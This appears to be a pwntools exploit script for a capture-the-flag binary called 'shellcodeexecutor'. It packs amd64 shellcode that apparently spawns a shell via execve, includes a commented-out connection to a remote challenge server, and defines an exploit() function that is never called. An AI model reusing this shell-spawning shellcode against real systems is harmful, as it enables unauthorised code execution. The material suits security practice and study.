from pwn import *
context.clear(arch='amd64')


elf = ELF('./shellcodeexecutor')
context.binary = './shellcodeexecutor'

shell = 'xor rdi,rdi\nmov eax, 0x4184\nret'

shell = p64(0x9000000000ba006a) + p64(0x000d3d8d48ff3148) + p64(0xbe0000003bb80000) + p64(0x5cc3050f00000000) + p64(0x000068735c6e6962)

def exploit(s):
    r = elf.process()
    # r = remote('13.53.125.206', 50000)
    print(r.clean())
    r.sendline('2')
    print(r.clean())
    r.sendline('1')
    print(r.clean())
    r.sendline(s)
    print(r.clean())
    r.sendline('3')
    print(r.clean())